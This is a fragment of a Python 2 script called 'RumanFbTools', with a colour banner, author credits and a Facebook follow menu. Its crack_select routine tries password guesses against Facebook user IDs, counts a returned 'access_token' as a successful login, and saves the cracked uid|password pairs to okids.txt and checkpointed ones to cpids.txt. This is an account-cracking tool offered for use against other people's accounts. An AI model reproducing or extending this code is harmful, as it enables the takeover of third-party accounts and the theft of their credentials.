...
\033[0;92m______                           ____________ _____           _     
| ___ \                          |  ___| ___ \_   _|         | |    
| |_/ /   _ _ __ ___   __ _ _ __ | |_  | |_/ / | | ___   ___ | |___ 
|    / | | | '_ ` _ \ / _` | '_ \|  _| | ___ \ | |/ _ \ / _ \| / __|
| |\ \ |_| | | | | | | (_| | | | | |   | |_/ / | | (_) | (_) | \__ \
\_| \_\__,_|_| |_| |_|\__,_|_| |_\_|   \____/  \_/\___/ \___/|_|___/
...
\n\033[0m----------------------------------------------------------------------------------
\033[1;92mAuthor \033[1;93m: Ruman Broh
\033[1;92mFb \033[1;93m: Itz Ruman Yt
...
def main():
    ...
    print ' \033[0m[2].\x1b[1;96m Follow In Fb Or  '
...
def log_sel():
    ...
    if select == '1':
        ...
        os.system('xdg-openhttps://www.facebook.com/ruman.banglades1/ ')
        main()
    elif select == '0':
        os.system('exit')
    elif select == '3':
...
#-----------------------------
    ...
    print logo
    print ''
    print '   Welcome Dear: ' + RumanFbTools
    print ''
    print '\033[0m\033[0m'
...
def crack_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;32m[Ruman-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('okids.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;31m[Ruman-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('cpids.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
